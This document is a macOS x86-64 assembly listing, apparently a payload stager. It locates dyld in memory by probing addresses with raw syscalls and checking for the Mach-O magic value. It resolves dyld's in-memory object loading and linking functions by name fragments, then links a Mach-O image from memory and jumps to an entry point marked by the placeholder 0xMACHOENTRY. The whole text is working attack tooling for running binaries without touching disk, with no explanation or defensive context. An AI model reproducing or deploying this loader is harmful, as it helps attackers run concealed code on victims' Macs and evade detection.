.section __TEXT,__text,regular,pure_instructions
.globl _main
_main:
  pushq %rbp
  movq %rsp, %rbp
  subq $0x50, %rsp
  movq %r15, 0x10(%rsp)
  movq %r12, 0x18(%rsp)
  xorq %rcx, %rcx
  movq $0x1000, %rdx
  xorq %rsi, %rsi
  movq $0x100000000, %rdi
  callq _finddyld
  xorq %rcx, %rcx
  movq $0x1000, %rdx
  addq $0x1000, %rsi
  movq %rsi, %rdi
  xorq %rsi, %rsi
  callq _finddyld
  movq %rsi, 0x20(%rsp)
  movq 0x20(%rsp), %rdx
  movq $0x19, %rsi
  movq $0x4d6d6f72, %rdi
  callq _resolvesymbol
  movq %rax, 0x28(%rsp)
  movq 0x20(%rsp), %rdx
  movq $0x4, %rsi
  movq $0x4d6b6e69, %rdi
  callq _resolvesymbol
  movq %rax, 0x30(%rsp)
  movq 0x10(%rsp), %rdi
  movl $0x8, 0xC(%rdi)
  movq 0x18(%rsp), %rsi
  leaq 0x38(%rsp), %rdx
  movq 0x28(%rsp), %rax
  callq *%rax
  testb %al, %al
  jz _exit

  movq 0x38(%rsp), %rdi
  movw $0x6d, 0x40(%rsp)
  leaq 0x40(%rsp), %rsi
  movl $0x3, %edx
  movq 0x30(%rsp), %rax
  callq *%rax
  movq %rax, %rdi
  xorq %rsi, %rsi
  movq $0x8, %rdx
  movq $1, %rcx
  callq _finddyld
  cmpq $0x0, %rsi
  je _exit
  addq $0xMACHOENTRY, %rsi
  callq *%rsi

_exit:
  addq $0x50, %rsp
  popq %rbp

  retq

# Locates the dlyd in memory.
# Machine code will keep going if it reaches the end
# of a function without a retq or jmpq.
_finddyld:
  pushq %rbp
  movq %rsp, %rbp
  subq $0x20, %rsp
  movq %rdi, (%rsp)
  movq %rsi, 0x8(%rsp)
  movq %rdx, 0x10(%rsp)
  movq %rcx, 0x18(%rsp)
  movq (%rsp), %rbx
_fdloop0:
  movq 0x18(%rsp), %rcx
  cmpq $1, %rcx
  jne _fdcheck
  movq (%rbx), %rcx
  movq %rcx, %rdi
  jmp _fddref
_fdcheck:
  movq %rbx, %rdi
_fddref:
  movq $0x1ff, %rsi
  movq $0x200000F, %rax
  syscall
  xorq %rsi, %rsi
  cmpq $2, %rax
  jne _fdloop1
  movl (%rdi), %edx
  movl $0xfeedfacf, %eax
  cmpl %edx, %eax
  jne _fdloop1
  movq %rdi, 0x8(%rsp)
  jmp _fdexit
_fdloop1:
  add 0x10(%rsp), %rbx
  jmp _fdloop0
_fdexit:
  movq 0x8(%rsp), %rsi
  addq $0x20, %rsp
  popq %rbp
  retq

_resolvesymbol:
  pushq %rbp
  movq %rsp, %rbp
  subq $0x50, %rsp
  movq %rdi, 0x28(%rsp)
  movq %rdx, 0x30(%rsp)
  movq %rsi, 0x38(%rsp)
  movq 0x30(%rsp), %rbx
  movq %rbx, %r8
  addq $0x20, %r8
  movl 0x10(%rbx), %ecx
  decl %ecx
_rsloop:
  movl (%r8), %edx
  cmpl $0x2, %edx
  jne _rscont0
  movq %r8, (%rsp)
_rscont0:
  cmpl $0x19, %edx
  jne _rscont1
  movq %r8, 0x8(%rsp)
  movq %r8, %r11
  movq 0xA(%r8), %rdx
  cmpl $0x4b4e494c, %edx
  jne _case
  movq %r11, 0x10(%rsp)
  jmp _rscont1
_case:
  cmpl $0x54584554, %edx
  jne _rscont1
  movq %r11, 0x18(%rsp)
_rscont1:
  movl 0x4(%r8), %edx
  addq %rdx, %r8
  decq %rcx
  cmpq $0x0, %rcx
  jne _rsloop
  movq 0x10(%rsp), %r12
  cmpq $0x0, %r12
  jne _getvaddr
  movq $-0x1, %rax
  addq $0x50, %rsp
  popq %rbp
  retq

_getvaddr:
  xorq %r12, %r12
  xorq %r13, %r13
  xorq %r14, %r14
  xorq %rdx, %rdx
  xorq %rdi, %rdi
  xorq %rbx, %rbx
  movq 0x10(%rsp), %r12
  movl 0x18(%r12), %r12d
  movq 0x18(%rsp), %r13
  movl 0x18(%r13), %r13d
  movq 0x10(%rsp), %r14
  movl 0x28(%r14), %r14d
  subq %r13, %r12
  subq %r14, %r12
  movq %r12, 0x20(%rsp)
  movq 0x30(%rsp), %rbx
  add %r12, %rbx
  movq (%rsp), %rdx
  movl 0x10(%rdx), %edi
  addq %rdi, %rbx
  movq %rbx, 0x40(%rsp)
  movq (%rsp), %rdx
  xorq %rax, %rax
  movl 0xC(%rdx), %eax
  decq %rax
  movq 0x30(%rsp), %rbx
  movq %r12, %r8
  addl 0x8(%rdx), %r8d
  addq %rbx, %r8
  xorq %rcx, %rcx
_gvloop:
  movq 0x40(%rsp), %rdi
  movl (%r8, %rcx, 8), %r11d
  addq %r11, %rdi
  xorq %r13, %r13
  movl 0x38(%rsp), %r13d
  movl 0x28(%rsp), %r14d
  addq %r13, %rdi
  movl (%rdi), %r13d
  cmpl %r14d, %r13d
  jne _gvcontinue
  leaq (%r8, %rcx, 8), %r11
  movq 0x8(%r11), %r11
  addq %r11, %rbx
  movq %rbx, %rax
  addq $0x50, %rsp
  popq %rbp
  retq
_gvcontinue:
  inc %rcx
  cmpq %rax, %rcx
  jl _gvloop
  movq $-0x1, %rax
  addq $0x50, %rsp
  popq %rbp
  retq
